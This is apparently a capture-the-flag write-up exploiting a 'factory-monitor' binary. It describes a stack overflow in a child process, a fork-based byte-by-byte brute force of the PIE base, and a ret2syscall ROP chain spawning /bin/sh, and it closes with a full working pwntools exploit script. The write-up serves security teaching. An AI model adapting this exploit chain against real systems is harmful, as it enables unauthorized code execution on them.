## I. Reconnaissance

- FILE

  ![](./image/1.png)

- Checksec

  ![](./image/2.png)
  #### Key Takeaways:
  
   * **Architecture (64-bit/amd64)**
   * **Statically Linked:** The binary does not rely on external `libc.so.` This means we cannot use `system()` or standard `ret2libc` techniques. We must rely on ROP gadgets within the binary to trigger direct system calls `syscall`.
   * **PIE Enabled**
   * **Canary Found:** checksec reports that stack canaries are enabled. However, this is a compiler-level optimization trap; as we will see, the specific vulnerable function doesn't have a canary.
## II. Vulnerability Analysis
- Decompiling the binary reveals a classic vulnerability inside the child process's execution flow. The parent process uses `fork()` to spawn child machines and communicates with them via bidirectional pipes. The child process runs `machine_main_demo` and reads commands from the pipe using function `read_line_fd`:
```C
int __cdecl read_line_fd(int fd, char *out)
{
  size_t v3; // rax
  char c; // [rsp+1Fh] [rbp-11h] BYREF
  ssize_t n; // [rsp+20h] [rbp-10h]
  size_t pos; // [rsp+28h] [rbp-8h]

  pos = 0LL;
  while ( 1 )
  {
    n = read((unsigned int)fd, &c, 1LL);
    if ( !n )
      break;
    if ( n >= 0 )
    {
      if ( c == 10 )
        return pos;
      v3 = pos++;
      out[v3] = c;
    }
    else if ( *(_DWORD *)_errno_location() != 4 )
    {
      return -1;
    }
  }
  if ( !pos )
    return 0;
  return pos;
}
```
- The `read_line_fd` function writes into a fixed-size 256-byte stack buffer. However, it keeps reading until it encounters a newline without checking if the buffer is full. This causes a massive Stack Buffer Overflow.
- While the parent process safely uses fgets (limiting input to 512 bytes) when reading from our network connection, the child blindly pulls that data from the pipe. We have exactly enough space (~500 bytes) to overflow the child's buffer and overwrite its Return Address.
- Furthermore, the `machine_main_demo` function is compiled without a stack canary, leaving the Return Address completely unprotected.
## III. Exploitation Strategy
- Our exploit will consist of 2 main stages, leveraging the `fork()` side-channel:
  1. **Find the PIE Base:** Since `fork()` creates an exact clone of the parent's memory layout, the child inherits the parent's PIE base. We will perform a Byte-by-Byte Bruteforce on the Return Address. If we guess wrong, the child crashes. If we guess right, it exits safely. We use the parent's monitor command to observe this without breaking our connection.
  2. **Single-Stage ROP & Pop Shell:** Once the PIE base is known, we will send a payload to overwrite the Return Address with a ret2syscall chain. We will point the registers to execute `execve("/bin/sh", 0, 0)`.
## IV. Execution
#### Step 1: Bypassing PIE via Side-Channel Bruteforce
- The offset from the `buf` to the Return Address is exactly 280 bytes.
- We overwrite the Return Address one byte at a time. For each guess, we append the test byte to our padding and send the `fail` command to force the child to return.
- The parent checks the child's status:
  - If the parent says `exited with status` or `exited successfully`, our byte guess successfully pointed to a valid/safe gadget (like `call exit`). We lock in the byte.
  - If the parent says `Restarting` (which means the child crashed/segfaulted), our guess was wrong.
- We repeat this for 5 bytes. The lowest byte is already known to be 0x57(because the return address of machine_main_demo is pie_base + 0xb457). Subtracting the fixed gadget offset from the leaked address gives us the PIE Base.
#### Step 2: Preparing the Target String ("/bin/sh")
- To call `execve`, we need the string `"/bin/sh"` stored somewhere in memory. We can achieve this cleanly by creating a machine named `/bin/sh` using the parent's create command. This stores the string in the static `MACHINES_BSS` array.
#### Step 3: Executing ret2syscall
- We trigger the buffer overflow with this payload and send `fail`. The child process executes the ROP chain and transforms into a `/bin/sh` shell.
## V. Exploit Script
```python
from pwn import *
import time

context.arch = 'amd64'

EXIT_PATH_OFFSET      = 0xb457    
POP_RDI_RBP_RET       = 0xc028    
POP_RSI_RBP_RET       = 0x15b26   
POP_RDX_XOR_EAX_POP4  = 0x836dc   
POP_RAX_RET           = 0x40dcb   
SYSCALL_RET           = 0x38129   
MACHINES_BSS          = 0xc5a20   
BUF_TO_RET            = 0x118     

def do_attempt(p, target_bytes, candidate):
    test_bytes = bytes(target_bytes + [candidate])
    payload = b'B' * BUF_TO_RET + test_bytes

    if b'\n' in payload:
        return None

    p.sendline(b'send 0 ' + payload)
    p.recvuntil(b'factory> ')
    p.sendline(b'send 0 fail')
    p.recvuntil(b'factory> ')

    correct = False
    for _ in range(15):
        time.sleep(0.05)
        p.sendline(b'monitor 0')
        resp = p.recvuntil(b'factory> ', timeout=2)

        if b'RUNNING' not in resp:
            correct = b'exited with status' in resp or b'exited successfully' in resp
            
            if b'Restarting' in resp:
                p.sendline(b'recv 0 1000')
                p.recvuntil(b'factory> ')
            elif b'exited successfully' in resp:
                p.sendline(b'start 0')
                p.recvuntil(b'factory> ')
                p.sendline(b'recv 0 1000')
                p.recvuntil(b'factory> ')
            break 

    return correct

def phase1_bruteforce(p):
    p.sendline(b'create AAAA 7')
    p.recvuntil(b'factory> ')
    p.sendline(b'start 0')
    p.recvuntil(b'factory> ')
    p.sendline(b'recv 0 1000')
    p.recvuntil(b'factory> ')

    target_bytes = [0x57]  

    for byte_pos in range(1, 6):
        if byte_pos == 1:
            candidates = [(n*16 + 0xb4) & 0xFF for n in range(16)]
            candidates = [c for c in candidates if c != 0x0a]
        elif byte_pos == 5:
            candidates = list(range(0x55, 0x80)) + list(range(0, 0x55)) + list(range(0x80, 0x100))
            candidates = [c for c in candidates if c != 0x0a]
        else:
            candidates = list(range(256))
            candidates = [c for c in candidates if c != 0x0a]

        found = False
        for candidate in candidates:
            result = do_attempt(p, target_bytes, candidate)
            if result is None:
                continue
            if result:
                target_bytes.append(candidate)
                found = True
                break
        if not found:
            return None

    addr_bytes = bytes(target_bytes) + b'\x00' * (8 - len(target_bytes))
    ret_addr = u64(addr_bytes)
    return ret_addr - EXIT_PATH_OFFSET

def phase2_shell(p, pie_base):
    def a(off): return pie_base + off

    p.sendline(b'stop 0')
    p.recvuntil(b'factory> ')
    p.sendline(b'cleanup 0')
    p.recvuntil(b'factory> ')
    p.sendline(b'deinit 0')
    p.recvuntil(b'factory> ')
    
    p.sendline(b'create /bin/sh 1')
    p.recvuntil(b'factory> ')
    p.sendline(b'start 0')
    p.recvuntil(b'factory> ')
    p.sendline(b'recv 0 1000')
    p.recvuntil(b'factory> ')

    binsh_addr = a(MACHINES_BSS) 
    payload = b'B' * BUF_TO_RET

    payload += p64(a(POP_RDX_XOR_EAX_POP4))
    payload += p64(0)              
    payload += p64(0) * 4          
    payload += p64(a(POP_RDI_RBP_RET))
    payload += p64(binsh_addr)     
    payload += p64(0)              
    payload += p64(a(POP_RSI_RBP_RET))
    payload += p64(0)              
    payload += p64(0)              
    payload += p64(a(POP_RAX_RET))
    payload += p64(59)             
    payload += p64(a(SYSCALL_RET))

    if b'\n' in payload:
        return False

    p.sendline(b'send 0 ' + payload)
    p.recvuntil(b'factory> ')
    p.sendline(b'send 0 fail')
    
    time.sleep(0.5)
    return True

def main():
    p = process('./factory-monitor', stdin=PIPE, stdout=PIPE, stderr=PIPE)
    p.recvuntil(b'factory> ')

    pie_base = phase1_bruteforce(p)
    if pie_base is not None:
        phase2_shell(p, pie_base)
        p.interactive()
    else:
        p.close()

if __name__ == '__main__':
    main()
```
